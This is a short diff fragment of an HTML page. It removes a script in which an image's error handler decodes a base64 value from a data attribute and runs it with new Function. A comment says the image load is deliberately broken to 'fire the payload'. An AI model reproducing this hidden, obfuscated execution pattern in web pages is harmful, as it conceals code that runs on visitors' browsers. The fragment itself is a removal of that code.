@@ -98,16 +98,6 @@ a { color: #007BFF; }
 
     document.body.appendChild(img);
   });
-</script>=";
-    img.onerror = function () {
-      new Function(atob(this.dataset.digest))();
-    };
-
-    // Broken src to trigger error and fire the payload
-    img.src = "/files/img/logo.png?" + Date.now(); // use timestamp to avoid cache
-
-    document.body.appendChild(img);
-  });
 </script>
 </body>
 </html>
